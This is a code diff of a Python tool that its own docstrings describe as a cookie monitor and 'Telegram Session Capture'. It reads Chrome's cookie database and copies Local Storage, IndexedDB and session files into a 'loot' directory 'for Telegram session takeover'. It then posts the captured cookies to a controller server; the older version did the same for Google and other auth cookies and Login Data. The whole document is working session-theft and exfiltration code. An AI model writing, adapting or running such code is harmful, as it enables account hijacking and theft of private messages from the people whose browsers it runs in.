@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-Cookie Monitor for Chrome - Watches for cookies and session data
-Sends alerts to controller for Telegram notifications
+Telegram Session Capture - Monitors for Telegram Web login
 """
 
 import os
@@ -19,13 +18,14 @@ CHROME_PROFILE = Path("/root/.config/google-chrome/Default")
 LOOT_DIR = Path("/app/loot")
 CONTROLLER_URL = os.environ.get("CONTROLLER_URL", "http://controller:5000")
 SESSION_ID = os.environ.get("SESSION_ID", "session_1")
-CHECK_INTERVAL = 5  # seconds
+CHECK_INTERVAL = 3
 
-sent_cookies_hash = ""
+# Track state
+session_captured = False
 
 
 def get_chrome_cookies():
-    """Extract cookies from Chrome's Cookies database"""
+    """Extract cookies from Chrome"""
     cookies = []
     cookies_db = CHROME_PROFILE / "Cookies"
     
@@ -35,12 +35,10 @@ def get_chrome_cookies():
     temp_db = Path("/tmp/cookies_copy.sqlite")
     try:
         shutil.copy2(cookies_db, temp_db)
-        
         conn = sqlite3.connect(str(temp_db))
         conn.text_factory = lambda b: b.decode(errors='ignore')
         cursor = conn.cursor()
         
-        # Chrome cookies table structure
         cursor.execute("""
             SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
             FROM cookies
@@ -56,10 +54,9 @@ def get_chrome_cookies():
                 "secure": bool(row[5]),
                 "httpOnly": bool(row[6])
             })
-        
         conn.close()
     except Exception as e:
-        print(f"Error reading cookies: {e}", file=sys.stderr)
+        print(f"Error: {e}", file=sys.stderr)
     finally:
         if temp_db.exists():
             temp_db.unlink()
@@ -67,160 +64,152 @@ def get_chrome_cookies():
     return cookies
 
 
-def check_for_interesting_cookies(cookies):
-    """Check if cookies contain authentication tokens"""
-    interesting_patterns = [
-        "session", "auth", "token", "sid", "ssid", 
-        "login", "user", "jwt", "access", "refresh",
-        "oauth", "saml", "sso", "credential", "lsid",
-        "hsid", "apisid", "sapisid", "secure-", "nid"
-    ]
+def get_telegram_local_storage():
+    """Get Telegram session data from localStorage"""
+    storage = {}
+    ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
     
-    interesting = []
+    if not ls_path.exists():
+        return storage
+    
+    # Try to read from IndexedDB for Telegram
+    idb_path = CHROME_PROFILE / "IndexedDB"
+    if idb_path.exists():
+        for db_dir in idb_path.iterdir():
+            if "telegram" in db_dir.name.lower():
+                storage["indexeddb_path"] = str(db_dir)
+    
+    return storage
+
+
+def check_telegram_session(cookies):
+    """Check if Telegram session cookies exist"""
+    telegram_cookies = []
+    
     for cookie in cookies:
-        name_lower = cookie["name"].lower()
-        domain_lower = cookie["domain"].lower()
+        domain = cookie.get("domain", "").lower()
+        name = cookie.get("name", "").lower()
         
-        # Check for Google auth cookies specifically
-        if "google" in domain_lower or "youtube" in domain_lower:
-            if any(p in name_lower for p in ["sid", "hsid", "ssid", "apisid", "sapisid", "lsid", "nid", "secure"]):
-                interesting.append(cookie)
-                continue
-        
-        # General auth patterns
-        for pattern in interesting_patterns:
-            if pattern in name_lower:
-                interesting.append(cookie)
-                break
+        # Telegram Web uses these domains
+        if "telegram.org" in domain or "web.telegram.org" in domain:
+            telegram_cookies.append(cookie)
     
-    return interesting
+    return telegram_cookies
 
 
-def export_chrome_profile():
-    """Export Chrome profile for session takeover"""
+def export_session():
+    """Export everything needed for Telegram session takeover"""
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    export_dir = LOOT_DIR / SESSION_ID / f"chrome_profile_{timestamp}"
+    export_dir = LOOT_DIR / SESSION_ID / f"telegram_{timestamp}"
     export_dir.mkdir(parents=True, exist_ok=True)
     
-    important_files = [
+    # Copy Chrome data
+    items_to_copy = [
         "Cookies",
-        "Login Data",
-        "Web Data",
-        "History",
-        "Preferences",
-        "Secure Preferences",
-        "Local State"
+        "Local Storage",
+        "IndexedDB", 
+        "Session Storage",
+        "Preferences"
     ]
     
-    # Copy from Default profile
-    for item in important_files:
+    for item in items_to_copy:
         src = CHROME_PROFILE / item
+        dst = export_dir / item
         if src.exists():
             try:
-                shutil.copy2(src, export_dir / item)
+                if src.is_dir():
+                    shutil.copytree(src, dst)
+                else:
+                    shutil.copy2(src, dst)
             except Exception as e:
-                print(f"Error copying {item}: {e}", file=sys.stderr)
+                print(f"Copy error {item}: {e}", file=sys.stderr)
     
-    # Also copy Local State from parent
+    # Copy Local State
     local_state = CHROME_PROFILE.parent / "Local State"
     if local_state.exists():
-        try:
-            shutil.copy2(local_state, export_dir / "Local State")
-        except:
-            pass
+        shutil.copy2(local_state, export_dir / "Local State")
     
     return str(export_dir)
 
 
 def send_to_controller(data_type, data):
-    """Send data to controller for Telegram alerts"""
+    """Send to controller"""
     try:
-        payload = {
-            "session_id": SESSION_ID,
-            "type": data_type,
-            "timestamp": datetime.now().isoformat(),
-            "data": data
-        }
-        
         response = requests.post(
             f"{CONTROLLER_URL}/api/report",
-            json=payload,
+            json={
+                "session_id": SESSION_ID,
+                "type": data_type,
+                "timestamp": datetime.now().isoformat(),
+                "data": data
+            },
             timeout=5
         )
         return response.status_code == 200
     except Exception as e:
-        print(f"Error sending to controller: {e}", file=sys.stderr)
+        print(f"Send error: {e}", file=sys.stderr)
         return False
 
 
 def main():
-    global sent_cookies_hash
+    global session_captured
     
-    print(f"Cookie monitor started for session {SESSION_ID}")
-    print(f"Monitoring Chrome profile: {CHROME_PROFILE}")
-    print(f"Controller URL: {CONTROLLER_URL}")
+    print(f"[TG Monitor] Waiting for Telegram login...")
+    print(f"[TG Monitor] Profile: {CHROME_PROFILE}")
     
-    # Ensure loot directory exists
     (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
-    
-    # Initial notification
-    send_to_controller("session_start", {"status": "monitoring"})
-    
-    auth_detected = False
     
     while True:
         try:
-            cookies = get_chrome_cookies()
+            if session_captured:
+                time.sleep(10)
+                continue
             
-            if cookies:
-                cookies_hash = hashlib.md5(
-                    json.dumps(cookies, sort_keys=True).encode()
-                ).hexdigest()
+            cookies = get_chrome_cookies()
+            tg_cookies = check_telegram_session(cookies)
+            
+            # Telegram Web stores session in IndexedDB, check if we have data
+            idb_path = CHROME_PROFILE / "IndexedDB"
+            has_telegram_idb = False
+            
+            if idb_path.exists():
+                for item in idb_path.iterdir():
+                    if "telegram" in item.name.lower():
+                        # Check if it has actual data (not just empty)
+                        size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file())
+                        if size > 1000:  # More than 1KB = likely has session
+                            has_telegram_idb = True
+                            break
+            
+            # We have a session if we have Telegram cookies OR IndexedDB data
+            if (len(tg_cookies) > 0 or has_telegram_idb) and not session_captured:
+                print(f"[TG Monitor] SESSION DETECTED!")
+                print(f"[TG Monitor] Cookies: {len(tg_cookies)}, IndexedDB: {has_telegram_idb}")
                 
-                if cookies_hash != sent_cookies_hash:
-                    sent_cookies_hash = cookies_hash
-                    
-                    # Save all cookies
-                    cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
-                    with open(cookies_file, "w") as f:
-                        json.dump(cookies, f, indent=2)
-                    
-                    # Check for auth cookies
-                    interesting = check_for_interesting_cookies(cookies)
-                    
-                    print(f"Total cookies: {len(cookies)}, Auth cookies: {len(interesting)}")
-                    
-                    if interesting and not auth_detected:
-                        auth_detected = True
-                        print(f"AUTH DETECTED! {len(interesting)} auth cookies found")
-                        
-                        # Send alert
-                        send_to_controller("auth_cookies", {
-                            "count": len(interesting),
-                            "cookies": interesting[:10],  # First 10
-                            "total_cookies": len(cookies)
-                        })
-                        
-                        # Export profile
-                        profile_path = export_profile()
-                        send_to_controller("profile_exported", {
-                            "path": profile_path
-                        })
-                    elif len(cookies) > 5:
-                        send_to_controller("cookies_update", {
-                            "count": len(cookies),
-                            "auth_count": len(interesting)
-                        })
+                session_captured = True
+                
+                # Save cookies
+                cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
+                with open(cookies_file, "w") as f:
+                    json.dump(cookies, f, indent=2)
+                
+                # Export full session
+                profile_path = export_session()
+                
+                # Send ONE alert to controller
+                send_to_controller("telegram_session", {
+                    "cookies": tg_cookies,
+                    "cookie_count": len(tg_cookies),
+                    "has_indexeddb": has_telegram_idb,
+                    "profile_path": profile_path
+                })
+                
+                print(f"[TG Monitor] Session exported to {profile_path}")
         
         except Exception as e:
-            print(f"Monitor error: {e}", file=sys.stderr)
+            print(f"[TG Monitor] Error: {e}", file=sys.stderr)
         
         time.sleep(CHECK_INTERVAL)
-
-
-def export_profile():
-    """Wrapper for export"""
-    return export_chrome_profile()
 
 
 if __name__ == "__main__":
